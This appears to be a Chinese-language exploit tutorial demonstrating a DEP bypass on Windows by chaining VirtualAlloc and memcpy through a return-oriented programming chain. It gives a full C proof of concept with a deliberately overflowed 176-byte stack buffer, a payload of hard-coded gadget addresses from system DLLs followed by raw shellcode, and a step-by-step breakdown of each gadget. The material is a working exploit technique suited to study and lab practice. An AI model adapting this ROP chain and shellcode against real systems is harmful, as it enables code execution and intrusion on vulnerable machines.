###   VirtualAlloc 和 memcpy 串接繞過 DEP

###  VirtualAlloc 
```
LPVOID VirtualAlloc{

LPVOID lpAddress, // 要分配的內存區域的地址 (使用0自動分配)

DWORD dwSize, // 分配的大小

DWORD flAllocationType, // 分配的類型

DWORD flProtect // 該內存的初始保護屬性

};
```
###  memcpy 
```
void *memcpy( void *dest, const void *src, size_t count );

dest
新的緩衝區。

src
要複製的緩衝區。

count
要複製的字元數目。
```
----

### POC  
####  debug 版本
####  memcpy 被我加大 550，因為 rop 太大 shellcode 塞不下
####  溢出的那個retn 直接放 VirtualAlloc
```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
char shellcode[]=

"\xb3\x1d\x92\x7c"  //7C921DB3  memcpy
"\x98\x03\xf5\x77" //77F50398 jmp eax

//3個參數
"BBBB"
"BBBB"
"\x80\x01\x00\x00"

// totoal 20 bytes


"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

"\xe1\x9a\x80\x7c" // virtual
"\x02\x07\x76\x7d" // rop start 

//virtual 參數
"\x00\x00\x00\x00"
"\x80\x01\x00\x00"
"\x00\x10\x00\x00"
"\x40\x00\x00\x00"


// rop
"\x17\x2e\x5c\x7d"
"\xAA\xAA\xAA\xAA"
"\x52\x05\xec\x77"
"\x3C\xFF\xFF\xFF" // -0xc4 // 手動填充
"\x8f\x4c\xdd\x77"
"\x81\x8b\x20\x77"
"\x45\xc2\x93\x7c"
"\xf2\x0f\x20\x77"
"\xa4\x23\xf0\x77"
"\x90\x90\x90\x90"
"\xc8\x59\x92\x7c"
"\xAA\xAA\xAA\xAA"
"\xbd\xea\x69\x7d"
"\xb8\x19\x59\x7d"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\x00\x8e\x75\x7d"
"\x1d\xec\xc1\x77"
"\x90\x90\x90\x90"
"\x1d\xec\xc1\x77"
"\x90\x90\x90\x90"
"\xda\xfb\x98\x7c"
"\x90\x90\x90\x90"
"\xa5\x2f\xfe\x73"
"\xed\x62\xd4\x77"
"\xc8\x59\x92\x7c"
"\x21\x65\x77\x7d"
"\x90\x90\x90\x90"
"\xa4\x23\xf0\x77"
"\x90\x90\x90\x90"
"\x9a\x06\xc0\x77"
"\xAA\xAA\xAA\xAA"
"\x0c\x00\x00\x00" //0x0c // 手動填充
"\x9f\x26\x92\x7c"
"\x84\xa5\xf1\x77"

"BBBBBBBBBBBBBBBB" //padding rop 設定shellcode 的位置=  iesp+a0  shellcode在下面。中間需要填充

"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"

;

void test()
{
	char tt[176];
	memcpy(tt,shellcode,550);
}
int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
    return 0;
}
```

###  規劃圖

![enter image description here](https://i.imgur.com/nEXjxGY.jpg)


###  成功
![enter image description here](https://i.imgur.com/ucLQpai.png)



### rop gadget 說明

```



[rop 開始 儲存 iesp]
[ebp =12fe7c] =[iesp]

0x7d760702 :  # PUSH ESP # POP EBP # RETN 0x04    ** [shell32.dll] **   |  ascii{PAGE_EXECUTE_READ}/ 






[保存 iesp 給 esi]
0x7d5c2e17 (RVA : 0x00032e17) : # PUSH EBP # POP ESI # RETN    ** [shell32.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}



[手動讓 ecx = -0xc4]
0x77ec0552 :  # POP ECX # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}




[使ebp = iesp -0xc4]
0x77dd4c8f (RVA : 0x00034c8f) : # ADD EBP,ECX # RETN    ** [ADVAPI32.dll] **   |   {PAGE_EXECUTE_READ}




[eax = iesp -0xc4] [ebp = 可用地址]
0x77208b81 (RVA : 0x00088b81) : # XCHG EAX,EBP # RETN    ** [comctl32.dll] **   |   {PAGE_EXECUTE_READ}


[clear ecx=0]
0x7c93c245 (RVA : 0x0001c245) : # XOR ECX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}


[ecx = 可用地址]
0x77200ff2 (RVA : 0x00080ff2) : # ADD ECX,EBP # RETN    ** [comctl32.dll] **   |   {PAGE_EXECUTE_READ}


[mem 第一個參數 OK]
0x77f023a4 :  # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04    ** [GDI32.dll] **   |   {PAGE_EXECUTE_READ}

///////////////////////////////////////////////
///////////////////////////////////////////////



[保存 eax 給 ebx  = iesp -0xc4 ]

0x7c9259c8 (RVA : 0x000059c8) : # XCHG EAX,EBX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}





[ecx= iesp-1 ]
0x7d69eabd (RVA : 0x0010eabd) : # MOV ECX,ESI # DEC ECX # RETN 0x0C    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}

[修復 ecx =iesp]
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}




[eax = a0]
0x7d758e00 (RVA : 0x001c8e00) : # XOR EAX,EAX # RETN    ** [shell32.dll] **   |  null {PAGE_EXECUTE_READ}

0x77c1ec1d (RVA : 0x0003ec1d) : # ADD EAX,40 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

0x77c1ec1d (RVA : 0x0003ec1d) : # ADD EAX,40 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

*****

0x7c98fbda (RVA : 0x0006fbda) : # ADD EAX,20 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
******



[eax = iesp +a0]
0x73fe2fa5 :  # ADD EAX,ECX # RETN    ** [USP10.dll] **   |   {PAGE_EXECUTE_READ}



[ecx = iesp +a0]
0x77d462ed (RVA : 0x000362ed) : # XCHG EAX,ECX # RETN    ** [USER32.dll] **   |   {PAGE_EXECUTE_READ}



[ebx 還原 eax   = iesp -0xc4]
0x7c9259c8 (RVA : 0x000059c8) : # XCHG EAX,EBX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}


***
[eax = iesp -0xc4+4]
0x7d776521 (RVA : 0x001e6521) : # ADD EAX,4 # POP ESI # RETN    ** [shell32.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}

***



[參數2 OK]
0x77f023a4 :  # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04    ** [GDI32.dll] **   |   {PAGE_EXECUTE_READ}




//////////////////////////////////////////////


[手動 給 ecx 0x0c]
0x77c0069a :  # POP ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}


[eax = mem]
0x7c92269f :  # SUB EAX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}

[跳轉 OK]
0x77f1a584 (RVA : 0x0002a584) : # XCHG EAX,ESP # RETN    ** [GDI32.dll] **   |   {PAGE_EXECUTE_READ}







///////////////////////////////////

```


###  rop 教學參考

[第五與第六劍：使用 ROP 串接多個函式的呼叫](http://securityalley.blogspot.com/2015/02/blog-post_6.html)
